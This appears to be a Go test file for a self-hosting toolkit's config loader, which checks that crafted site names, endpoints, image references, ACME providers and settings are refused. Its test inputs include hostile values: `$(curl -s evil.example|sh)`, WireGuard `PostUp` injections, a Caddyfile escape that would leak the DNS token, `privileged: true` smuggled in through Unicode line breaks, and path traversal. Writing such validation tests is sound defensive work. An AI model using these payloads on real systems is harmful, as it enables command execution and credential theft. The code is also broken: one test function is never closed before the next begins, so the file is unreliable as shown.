		return "operators:\n  alice:\n    name: \"" + name + "\"\n    email: \"" + email + "\"\n    keys: \"" + keys + "\"\n"
	}
	cases := []struct {
		name, body, want string
	}{
		{"key comment", withAdmin(minimal, alice("Alice Example", "alice@example.org", fakeKeyA+" "+esc)), "operators.alice.keys: line 1 holds a control character (U+001B)"},
		{"tab in a key", withAdmin(minimal, alice("Alice Example", "alice@example.org", strings.Replace(fakeKeyA, " alice", `\talice`, 1))), "operators.alice.keys: line 1 holds a control character (U+0009)"},
		{"C1 in a key", withAdmin(minimal, alice("Alice Example", "alice@example.org", fakeKeyA+` \x9b2K`)), "operators.alice.keys: line 1 holds a control character (U+009B)"},
		{"name", withAdmin(minimal, alice(`Alice `+esc, "alice@example.org", fakeKeyA)), "operators.alice.name holds a control character (U+001B)"},
		{"email", withAdmin(minimal, alice("Alice Example", `alice\x7f@example.org`, fakeKeyA)), "operators.alice.email holds a control character (U+007F)"},
		{"image", strings.Replace(minimal, "    placement: cluster\n", "    placement: cluster\n    images:\n      app: \"ghcr.io/example/mbin:1.0"+esc+"\"\n", 1), "apps.talk.images.app holds a control character (U+001B)"},
		{"acme image", strings.Replace(minimal, "operators:\n", "acme:\n  provider: desec\n  image: \"ghcr.io/example/caddy:1"+esc+"\"\noperators:\n", 1), "acme.image holds a control character (U+001B)"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			msg := loadErr(t, c.body)
			if !strings.Contains(msg, c.want) || !strings.Contains(msg, "terminal") {
				t.Errorf("want %q in the refusal, got:\n%s", c.want, msg)
			}
			if strings.ContainsRune(msg, 0x1b) {
				t.Errorf("the refusal prints the character itself:\n%q", msg)
			}
		})
	}
}

// The gate's client carries the community's name, falling back to the app's
// when the community has none; every other app's carries its own.
func TestClientName(t *testing.T) {
	c := &config.Config{Community: config.Community{Name: "Example Community"}}
	if got := c.ClientName(config.GateApp); got != "Example Community" {
		t.Errorf("the gate's client is %q", got)
	}
	if got := c.ClientName("talk"); got != "talk" {
		t.Errorf("talk's client is %q", got)
	}
	c.Community.Name = ""
	if got := c.ClientName(config.GateApp); got != config.GateApp {
		t.Errorf("with no community name, the gate's client is %q", got)
	}

	c.Apps = map[string]config.App{"docs": {DisplayName: "Wiki"}, "blog": {}}
	if got := c.ClientName("docs"); got != "Wiki" {
		t.Errorf("with a display name, docs's client is %q", got)
	}
	if got := c.ClientName("blog"); got != "blog" {
		t.Errorf("with no display name, blog's client is %q", got)
	}
	if got := c.ClientName("gone"); got != "gone" {
		t.Errorf("an app no longer declared has client %q", got)
	}
}

// The toolkit writes arch itself, so a value it would never write is a
// hand edit gone wrong, refused at load rather than compared with a host.
func TestUnknownArchIsRefused(t *testing.T) {
	body := strings.Replace(minimal, "    address: 10.44.0.1\n", "    address: 10.44.0.1\n    arch: armhf\n", 1)
	_, err := config.Load(write(t, body))
	if err == nil || !strings.Contains(err.Error(), "sites.home-a.arch") {
		t.Fatalf("an unknown arch loaded: %v", err)
	}
	for _, arch := range []string{"amd64", "arm64"} {
		body := strings.Replace(minimal, "    address: 10.44.0.1\n", "    address: 10.44.0.1\n    arch: "+arch+"\n", 1)
		cfg, err := config.Load(write(t, body))
		if err != nil {
			t.Fatalf("arch %s was refused: %v", arch, err)
		}
		if cfg.Sites["home-a"].Arch != arch {
			t.Errorf("arch %s read as %q", arch, cfg.Sites["home-a"].Arch)
		}
	}
}

// An app is rendered into a stack directory named for it, beside the
// toolkit's own, so an app may not take a toolkit stack's name.
func TestAnAppIsNeverNamedForAToolkitStack(t *testing.T) {
	named := validConfig + `  infra:
    blueprint: wikijs
    hostname: wiki.example.org
    placement: cluster
`
	if _, err := config.Load(write(t, named)); err == nil || !strings.Contains(err.Error(), "apps.infra: the name is the toolkit's infrastructure stack's") {
		t.Errorf("an app named infra loaded, or was refused without saying why: %v", err)
	}
}

// An app's name is its stack's directory and compose project, so it is one
// lowercase word: a slash, a dot segment or a capital would put its files
// somewhere else, or out of the review that reads every stack.
func TestAnAppNameIsOneWord(t *testing.T) {
	for _, name := range []string{"a/b", "..", "../x", ".", "Talk", "../../../etc/cron.d", "-x", "a.b"} {
		named := validConfig + `  "` + name + `":
    blueprint: wikijs
    hostname: wiki.example.org
    placement: cluster
`
		if _, err := config.Load(write(t, named)); err == nil || !strings.Contains(err.Error(), "is not an app name") {
			t.Errorf("%q: loaded, or refused without saying why: %v", name, err)
		}
	}
}

// A site's name is written into compose files, shell scripts, HAProxy and
// Patroni configuration, and a directory of `paisans render --out`, so it is
// one lowercase word: anything else could add keys to a compose file, run a
// command, or write outside the output directory.
func TestASiteNameIsOneWord(t *testing.T) {
	for _, name := range []string{`h\n    privileged: true`, `$(curl -s evil.example|sh)`, "..", ".", "a/b", "Home", "a b", "-x"} {
		named := strings.Replace(validConfig, "sites:\n", "sites:\n  \""+name+"\":\n    roles: [witness]\n    address: 10.44.0.9\n    ssh:\n      host: w.local\n      user: ubuntu\n      keys: [alice]\n", 1)
		if _, err := config.Load(write(t, named)); err == nil || !strings.Contains(err.Error(), "is not a site name") {
			t.Errorf("%q: loaded, or refused without saying why: %v", name, err)
		}
	}
}

// The values the toolkit's own templates write as they are, into WireGuard,
// Caddy and env files, are refused at load unless they are what they claim
// to be: a WireGuard file with a line added runs it as root (PostUp), and a
// Caddyfile or env file with one added routes or configures what nobody
// reviewed.
func TestValuesTheTemplatesWriteAsTheyAreAreChecked(t *testing.T) {
	cases := []struct{ from, to, want string }{
		{"    address: 10.44.0.1\n", "    address: 10.44.0.1\n    endpoint: \"evil\\nPostUp = touch /pwned:51820\"\n", "sites.home-a.endpoint"},
		{"    address: 10.44.0.1\n", "    address: 10.44.0.1\n    endpoint: \"$(id).example.org:51820\"\n", "sites.home-a.endpoint"},
		{"    address: 10.44.0.1\n", "    address: 10.44.0.1\n    public_address: \"203.0.113.1\\nPostUp = touch /pwned\"\n", "sites.home-a.public_address"},
		{"    address: 10.44.0.1\n", "    address: 10.44.0.1\n    public_address6: \"2001:db8::1\\nPostUp = x\"\n", "sites.home-a.public_address6"},
		{"  domain: example.org\n", "  domain: \"example.org\\n}\\nevil.example {\"\n", "community.domain"},
		{"    hostname: talk.example.org\n", "    hostname: \"talk.example.org {\\n\"\n", "apps.talk.hostname"},
		{"    hostname: talk.example.org\n", "    hostname: talk.example.org\n    hostnames:\n      media: \"m.example.org\\nX\"\n", "apps.talk.hostnames.media"},
	}
	for _, c := range cases {
		doc := strings.Replace(validConfig, c.from, c.to, 1)
		if doc == validConfig {
			t.Fatalf("%q not in the fixture", c.from)
		}
		if _, err := config.Load(write(t, doc)); err == nil || !strings.Contains(err.Error(), c.want+":") {
			t.Errorf("%s: loaded, or refused without naming it: %v", c.want, err)
		}
	}
}

// A YAML parser built on libyaml reads U+2028 and U+2029 as line breaks, so
// an image reference carrying them adds keys to the compose file it is
// written into: privileged, on the gateway's Caddy with the host's network.
// An image reference is refused unless it is one.
func TestAnImageReferenceIsOne(t *testing.T) {
	const payload = "ghcr.io/pocket-id/pocket-id:v1.0.0     privileged: true     x-pad: a:v1.0.0"
	cases := []struct{ from, to, want string }{
		{"    placement: cluster\n", "    placement: cluster\n    images:\n      app: \"" + payload + "\"\n", "apps.talk.images.app"},
		{"acme:\n  provider: desec\n", "acme:\n  provider: desec\n  image: \"" + payload + "\"\n", "acme.image"},
		{"acme:\n  provider: desec\n", "acme:\n  provider: desec\n  image: \"ghcr.io/x/caddy:2 #\"\n", "acme.image"},
	}
	for _, c := range cases {
		doc := strings.Replace(validConfig, c.from, c.to, 1)
		if doc == validConfig {
			t.Fatalf("%q not in the fixture", c.from)
		}
		if _, err := config.Load(write(t, doc)); err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: loaded, or refused without naming it: %v", c.want, err)
		}
	}
	for _, r := range []rune{' ', ' '} {
		if _, ok := config.ControlRune("a" + string(r) + "b"); !ok {
			t.Errorf("U+%04X is not a control character to ControlRune", r)
		}
	}
	// A track, which apply resolves, and a reference to one build pass.
	for _, ref := range []string{"ghcr.io/example-org/mbin:v1.*.*-fork", "docker.io/library/postgres:18.*-trixie", "ghcr.io/x/y:1.2@sha256:" + strings.Repeat("a", 64), "caddy:2.10.0"} {
		doc := strings.Replace(validConfig, "    placement: cluster\n", "    placement: cluster\n    images:\n      app: \""+ref+"\"\n", 1)
		if _, err := config.Load(write(t, doc)); err != nil {
			t.Errorf("%s: %v", ref, err)
		}
	}
}

// acme.provider is written into the Caddyfile's global options as it is, so
// it is a provider's name and nothing more: a crafted one could close the
// block and add a site that answers with the DNS token.
func TestAnACMEProviderIsAName(t *testing.T) {
	payload := `"desec {env.ACME_DNS_TOKEN}\n}\nevil.example {\n\trespond {env.ACME_DNS_TOKEN}\n}\n{\n\tacme_dns desec"`
	doc := strings.Replace(validConfig, "  provider: desec\n", "  provider: "+payload+"\n", 1)
	if _, err := config.Load(write(t, doc)); err == nil || !strings.Contains(err.Error(), "acme.provider:") {
		t.Errorf("a crafted acme.provider loaded, or was refused without naming it: %v", err)
	}
}

// A setting is written by a blueprint's templates into whatever format the
// application reads (JSON, INI, env, YAML), so a control character in one,
// a line break above all, could add a line to it. Each string setting, and
// each string in a list or a mapping, is refused if it holds one; the
// account's code of conduct, written as a Markdown file of its own, may hold
// line breaks and tabs.
func TestASettingHoldsNoControlCharacter(t *testing.T) {
	cases := []struct{ settings, want string }{
		{"      site_name: \"Blog\\n[app]\\nopen_registration = true\"\n", "apps.talk.settings.site_name"},
		{"      brand: \"x\\u2028y\"\n", "apps.talk.settings.brand"},
		{"      groups: [members, \"a\\nKBIN_X=1\"]\n", "apps.talk.settings.groups"},
		{"      nested: {a: \"b\\tc\"}\n", "apps.talk.settings.nested"},
	}
	for _, c := range cases {
		doc := strings.Replace(validConfig, "    placement: cluster\n", "    placement: cluster\n    settings:\n"+c.settings, 1)
		if _, err := config.Load(write(t, doc)); err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: loaded, or refused without naming it: %v", c.want, err)
		}
	}
}

// SetSSHUser writes the file in place, keeping its mode, and Load then reads
// the name as declared; a second call with the same name changes nothing.
func TestSetSSHUserWritesTheFile(t *testing.T) {
	path := write(t, withSSH("    ssh:\n      host: home-a.local\n      keys: [alice]\n"))
	if err := config.SetSSHUser(path, "home-a", "paisans-f2a9"); err != nil {
		t.Fatal(err)
	}
	first, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.Sites["home-a"].SSH.User; got != "paisans-f2a9" {
		t.Errorf("ssh.user read as %q, want paisans-f2a9", got)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("mode %v, want 0600", info.Mode().Perm())
	}
	if err := config.SetSSHUser(path, "home-a", "paisans-f2a9"); err != nil {
		t.Fatal(err)
	}
	if second, _ := os.ReadFile(path); string(second) != string(first) {
		t.Errorf("a second call changed the file:\n%s", second)
	}
}

// infra overrides the infrastructure stack's images. Its keys are the
// foundation's names for the images it replaces, so a key the toolkit does
// not run is refused rather than silently ignored.
func TestInfraImagesLoad(t *testing.T) {
	doc := validConfig + "infra:\n  images:\n    etcd: \"gcr.io/etcd-development/etcd:v3.5.21\"\n  postgres:\n    \"17\":\n      spilo: \"example.org/pg-ha:17.4-1\"\n"
	cfg, err := config.Load(write(t, doc))
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.Infra.Images["etcd"]; got != "gcr.io/etcd-development/etcd:v3.5.21" {
		t.Errorf("infra.images.etcd is %q", got)
	}
	if got := cfg.Infra.Postgres["17"]["spilo"]; got != "example.org/pg-ha:17.4-1" {
		t.Errorf("infra.postgres.17.spilo is %q", got)
	}
}

func TestInfraImagesAreChecked(t *testing.T) {
	const payload = "ghcr.io/x/etcd:v3.5.1     privileged: true"
	cases := []struct{ body, want string }{
		{"infra:\n  images:\n    caddy: \"ghcr.io/x/caddy:2.1.0\"\n", "infra.images.caddy"},
		{"infra:\n  images:\n    etcd: \"\"\n", "infra.images.etcd: empty"},
		{"infra:\n  images:\n    etcd: \"" + payload + "\"\n", "infra.images.etcd"},
		{"infra:\n  images:\n    etcd: \"ghcr.io/x/etcd:v3 #\"\n", "infra.images.etcd"},
		{"infra:\n  postgres:\n    \"17\":\n      app: \"postgres:17.1\"\n", "infra.postgres.17.app"},
		{"infra:\n  postgres:\n    \"17\":\n      spilo: \"\"\n", "infra.postgres.17.spilo: empty"},
	}
	for _, c := range cases {
		msg := loadErr(t, validConfig+c.body)
		if !strings.Contains(msg, c.want) {
			t.Errorf("%q: loaded, or refused without naming %s: %q", c.body, c.want, msg)
		}
	}
}

// The major a deployment runs is cluster.postgres_version, 18 when unset,
// and the Spilo it declares is the entry for that major alone.
func TestSpiloImageIsTheRunningMajors(t *testing.T) {
	cfg := &config.Config{Infra: config.Infra{Postgres: map[string]map[string]string{"17": {"spilo": "a:17"}, "18": {"spilo": "a:18"}}}}
	if got := cfg.PostgresMajor(); got != config.DefaultPostgresVersion {
		t.Errorf("an unset postgres_version is %q", got)
	}
	if got := cfg.SpiloImage(); got != "a:18" {
		t.Errorf("SpiloImage is %q, want the 18 entry", got)
	}
	cfg.Cluster.PostgresVersion = "17"
	if got := cfg.SpiloImage(); got != "a:17" {
		t.Errorf("SpiloImage is %q, want the 17 entry", got)
	}
	cfg.Cluster.PostgresVersion = "16"
	if got := cfg.SpiloImage(); got != "" {
		t.Errorf("SpiloImage is %q for a major with no entry", got)
// A mesh larger than a /24 would let the rules that treat the mesh as
// trusted cover an owner's LAN, so it is refused where it is declared.
func TestMeshLargerThanA24IsRefused(t *testing.T) {
	got := loadErr(t, strings.Replace(validConfig, "subnet: 10.44.0.0/24", "subnet: 10.44.0.0/16", 1))
	if !strings.Contains(got, "mesh.subnet") || !strings.Contains(got, "larger than a /24") {
		t.Errorf("got %q", got)
	}
}

// An app's hostname is held to the strict DNS-name rule everywhere it is
// declared, so a name validate accepts is one host request accepts too.
func TestAppHostnamesAreHeldToTheStrictRule(t *testing.T) {
	for _, bad := range []string{"a..example.org", strings.Repeat("a", 64) + ".example.org", "a_b.example.org", "Talk.example.org", "talk"} {
		got := loadErr(t, strings.Replace(validConfig, "hostname: talk.example.org", "hostname: "+bad, 1))
		if !strings.Contains(got, "apps.talk.hostname") {
			t.Errorf("hostname %q: got %q", bad, got)
		}
		got = loadErr(t, strings.Replace(validConfig, "hostname: talk.example.org", "hostname: talk.example.org\n    hostnames:\n      media: "+bad, 1))
		if !strings.Contains(got, "apps.talk.hostnames.media") {
			t.Errorf("hostnames.media %q: got %q", bad, got)
		}
	}
}

// A mesh over this network, loopback, link-local or multicast is refused
// where it is declared, by the rule a request is held to: the egress table
// on an admitted host accepts the mesh before it drops those ranges.
func TestMeshOverAReservedRangeIsRefused(t *testing.T) {
	for _, c := range []struct{ subnet, address, overlaps string }{
		{"0.0.0.0/24", "0.0.0.1", "0.0.0.0/8"},
		{"127.44.0.0/24", "127.44.0.1", "127.0.0.0/8"},
		{"169.254.44.0/24", "169.254.44.1", "169.254.0.0/16"},
		{"239.1.0.0/24", "239.1.0.1", "224.0.0.0/3"},
	} {
		body := strings.Replace(validConfig, "subnet: 10.44.0.0/24", "subnet: "+c.subnet, 1)
		body = strings.Replace(body, "address: 10.44.0.1", "address: "+c.address, 1)
		got := loadErr(t, body)
		if !strings.Contains(got, "mesh.subnet") || !strings.Contains(got, "overlaps "+c.overlaps) {
			t.Errorf("%s: got %q", c.subnet, got)
		}
	}
}

// A site address that is the mesh's network or broadcast address is
// refused, as a request refuses it.
func TestSiteAddressIsNotTheMeshsNetworkOrBroadcast(t *testing.T) {
	for _, a := range []string{"10.44.0.0", "10.44.0.255"} {
		got := loadErr(t, strings.Replace(validConfig, "address: 10.44.0.1", "address: "+a, 1))
		if !strings.Contains(got, "sites.home-a.address") || !strings.Contains(got, "network or broadcast address") {
			t.Errorf("%s: got %q", a, got)
		}
	}
}

// ssh.user is held to the rule a request's user is: never root, and never
// another deployment's paisans- user, whose authorized_keys host admit would
// otherwise write into. The deployment's own user and a user of the
// owner's are accepted.
func TestSSHUserIsNotRootOrAnotherDeployments(t *testing.T) {
	for _, c := range []struct{ user, want string }{
		{"root", "sites.home-a.ssh.user: root is never a deployment's user"},
		{"paisans-0a0b", "sites.home-a.ssh.user: paisans-0a0b is another deployment's name; this deployment's own user is paisans-f2a9"},
		{"paisans-f2a9", ""},
		{"ubuntu", ""},
	} {
		got := loadErr(t, strings.Replace(validConfig, "user: ubuntu", "user: "+c.user, 1))
		if c.want == "" && got != "" || !strings.Contains(got, c.want) {
			t.Errorf("%s: got %q", c.user, got)
		}
	}
}

// mesh.subnet is written in its canonical form, the one spelling a request
// carries, so a configuration validate accepts is one host request takes.
func TestMeshSubnetIsWrittenCanonically(t *testing.T) {
	for _, c := range []struct{ subnet, want string }{
		{"10.44.0.0/024", `mesh.subnet: "10.44.0.0/024" is not written in its canonical form, 10.44.0.0/24`},
		{"::ffff:10.44.0.0/120", `mesh.subnet: "::ffff:10.44.0.0/120" is not written in its canonical form`},
	} {
		got := loadErr(t, strings.Replace(validConfig, "subnet: 10.44.0.0/24", "subnet: "+c.subnet, 1))
		if !strings.Contains(got, c.want) {
			t.Errorf("%s: got %q\nwant it to say %q", c.subnet, got, c.want)
		}
	}
}

// A site address is written as plain dotted IPv4, as a request carries it.
func TestSiteAddressIsWrittenCanonically(t *testing.T) {
	got := loadErr(t, strings.Replace(validConfig, "address: 10.44.0.1", "address: ::ffff:10.44.0.1", 1))
	if !strings.Contains(got, `sites.home-a.address: "::ffff:10.44.0.1" is not written as plain dotted IPv4, 10.44.0.1`) {
		t.Errorf("got %q", got)
	}
}
